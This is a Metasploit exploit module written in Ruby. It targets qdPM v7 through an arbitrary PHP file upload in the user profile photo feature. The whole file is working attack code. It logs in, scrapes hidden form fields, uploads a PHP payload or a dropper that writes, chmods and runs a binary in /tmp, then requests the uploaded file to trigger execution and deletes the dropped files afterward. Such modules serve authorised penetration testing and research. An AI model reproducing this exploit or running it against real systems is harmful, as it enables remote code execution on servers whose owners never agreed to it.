##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "qdPM v7 Arbitrary PHP File Upload Vulnerability",
      'Description'    => %q{
        This module exploits a vulnerability found in qdPM - a web-based project management
        software. The user profile's photo upload feature can be abused to upload any
        arbitrary file onto the victim server machine, which allows remote code execution.
        Please note in order to use this module, you must have a valid credential to sign
        in.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'loneferret', #Discovery, PoC
          'sinn3r'      #Metasploit
        ],
      'References'     =>
        [
          ['OSVDB', '82978'],
          ['EDB', '19154']
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00"
        },
      'DefaultOptions'  =>
        {
          'ExitFunction' => "none"
        },
      'Platform'       => ['linux', 'php'],
      'Targets'        =>
        [
          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ],
          [ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Jun 14 2012",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base directory to sflog!', '/qdPM/']),
        OptString.new('USERNAME',  [true, 'The username to login with']),
        OptString.new('PASSWORD',  [true, 'The password to login with'])
      ], self.class)
  end

  def check
    target_uri.path << '/' if target_uri.path[-1,1] != '/'
    base = File.dirname("#{target_uri.path}.")

    res = send_request_raw({'uri'=>"#{base}/index.php"})
    if res and res.body =~ /<div id\=\"footer\"\>.+qdPM ([\d])\.([\d]).+\<\/div\>/m
      major, minor = $1, $2
      return Exploit::CheckCode::Vulnerable if (major+minor).to_i <= 70
    end

    return Exploit::CheckCode::Safe
  end

  def get_write_exec_payload(fname, data)
    p = Rex::Text.encode_base64(generate_payload_exe)
    php = %Q|
    <?php
    $f = fopen("#{fname}", "wb");
    fwrite($f, base64_decode("#{p}"));
    fclose($f);
    exec("chmod 777 #{fname}");
    exec("#{fname}");
    ?>
    |
    php = php.gsub(/^\t\t/, '').gsub(/\n/, ' ')
    return php
  end

  def on_new_session(cli)
    if cli.type == "meterpreter"
      cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
    end

    @clean_files.each do |f|
      print_status("#{@peer} - Removing: #{f}")
      begin
        if cli.type == 'meterpreter'
          cli.fs.file.rm(f)
        else
          cli.shell_command_token("rm #{f}")
        end
      rescue ::Exception => e
        print_error("#{@peer} - Unable to remove #{f}: #{e.message}")
      end
    end
  end

  def login(base, username, password)
    # Login
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => "#{base}/index.php/home/login",
      'vars_post' => {
        'login[email]'    => username,
        'login[password]' => password,
        'http_referer'    => ''
      },
      # This needs to be set, otherwise we get two cookies... I don't need two cookies.
      'cookie'     => "qdpm=#{Rex::Text.rand_text_alpha(27)}",
      'headers'   => {
        'Origin' => "http://#{rhost}",
        'Referer' => "http://#{rhost}/#{base}/index.php/home/login"
      }
    })

    cookie = (res and res.headers['Set-Cookie'] =~ /qdpm\=.+\;/) ? res.headers['Set-Cookie'] : ''
    return {} if cookie.empty?
    cookie = cookie.to_s.scan(/(qdpm\=\w+)\;/).flatten[0]

    # Get user data
    vprint_status("#{@peer} - Enumerating user data")
    res = send_request_raw({
      'uri' => "#{base}/index.php/home/myAccount",
      'cookie' => cookie
    })

    return {} if not res
    if res.code == 404
      print_error("#{@peer} - #{username} does not actually have a 'myAccount' page")
      return {}
    end

    b = res.body

    user_id = b.scan(/\<input type\=\"hidden\" name\=\"users\[id\]\" value\=\"(.+)\" id\=\"users\_id\" \/\>/).flatten[0] || ''
    group_id = b.scan(/\<input type\=\"hidden\" name\=\"users\[users\_group\_id\]\" value\=\"(.+)\" id\=\"users\_users\_group\_id\" \/>/).flatten[0] || ''
    user_active = b.scan(/\<input type\=\"hidden\" name\=\"users\[active\]\" value\=\"(.+)\" id\=\"users\_active\" \/\>/).flatten[0] || ''

    opts = {
      'cookie'     => cookie,
      'user_id'     => user_id,
      'group_id'    => group_id,
      'user_active' => user_active
    }

    return opts
  end

  def upload_php(base, opts)
    fname       = opts['filename']
    php_payload = opts['data']
    user_id     = opts['user_id']
    group_id    = opts['group_id']
    user_active = opts['user_active']
    username    = opts['username']
    email       = opts['email']
    cookie      = opts['cookie']

    data = Rex::MIME::Message.new
    data.add_part('UsersAccountForm', nil, nil, 'form-data; name="formName"')
    data.add_part('put', nil, nil, 'form-data; name="sf_method"')
    data.add_part(user_id, nil, nil, 'form-data; name="users[id]"')
    data.add_part(group_id, nil, nil, 'form-data; name="users[users_group_id]"')
    data.add_part(user_active, nil, nil, 'form-data; name="users[active]"')
    data.add_part('', nil, nil, 'form-data; name="users[skin]"')
    data.add_part(username, nil, nil, 'form-data; name="users[name]"')
    data.add_part(php_payload, nil, nil, "form-data; name=\"users[photo]\"; filename=\"#{fname}\"")
    data.add_part('', nil, nil, 'form-data; name="preview_photo"')
    data.add_part(email, nil, nil, 'form-data; name="users[email]"')
    data.add_part('en_US', nil, nil, 'form-data; name="users[culture]"')
    data.add_part('', nil, nil, 'form-data; name="new_password"')

    post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')

    res = send_request_cgi({
      'method'  => 'POST',
      'uri'     => "#{base}/index.php/home/myAccount",
      'ctype'   => "multipart/form-data; boundary=#{data.bound}",
      'data'    => post_data,
      'cookie'  => cookie,
      'headers' => {
        'Origin' => "http://#{rhost}",
        'Referer' => "http://#{rhost}#{base}/index.php/home/myAccount"
      }
    })

    return (res and res.headers['Location'] =~ /home\/myAccount$/) ? true : false
  end

  def exec_php(base, opts)
    cookie = opts['cookie']

    # When we upload a file, it will be renamed. The 'myAccount' page has that info.
    res = send_request_cgi({
      'uri'    => "#{base}/index.php/home/myAccount",
      'cookie' => cookie
    })

    if not res
      print_error("#{@peer} - Unable to request the file")
      return
    end

    fname = res.body.scan(/\<input type\=\"hidden\" name\=\"preview\_photo\" id\=\"preview\_photo\" value\=\"(\d+\-\w+\.php)\" \/\>/).flatten[0] || ''
    if fname.empty?
      print_error("#{@peer} - Unable to extract the real filename")
      return
    end

    # Now that we have the filename, request it
    print_status("#{@peer} - Uploaded file was renmaed as '#{fname}'")
    send_request_raw({'uri'=>"#{base}/uploads/users/#{fname}"})
    handler
  end

  def exploit
    @peer = "#{rhost}:#{rport}"

    target_uri.path << '/' if target_uri.path[-1,1] != '/'
    base = File.dirname("#{target_uri.path}.")

    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    print_status("#{@peer} - Attempt to login with '#{user}:#{pass}'")
    opts = login(base, user, pass)
    if opts.empty?
      print_error("#{@peer} - Login unsuccessful")
      return
    end

    php_fname = "#{Rex::Text.rand_text_alpha(5)}.php"
    @clean_files = [php_fname]

    case target['Platform']
    when 'php'
      p = "<?php #{payload.encoded} ?>"
    when 'linux'
      bin_name = "#{Rex::Text.rand_text_alpha(5)}.bin"
      @clean_files << bin_name
      bin = generate_payload_exe
      p = get_write_exec_payload("/tmp/#{bin_name}", bin)
    end

    print_status("#{@peer} - Uploading PHP payload (#{p.length.to_s} bytes)...")
    opts = opts.merge({
      'username' => user.scan(/^(.+)\@.+/).flatten[0] || '',
      'email'    => user,
      'filename' => php_fname,
      'data'     => p
    })
    uploader = upload_php(base, opts)
    if not uploader
      print_error("#{@peer} - Unable to upload")
      return
    end

    print_status("#{@peer} - Executing '#{php_fname}'")
    exec_php(base, opts)
  end
end
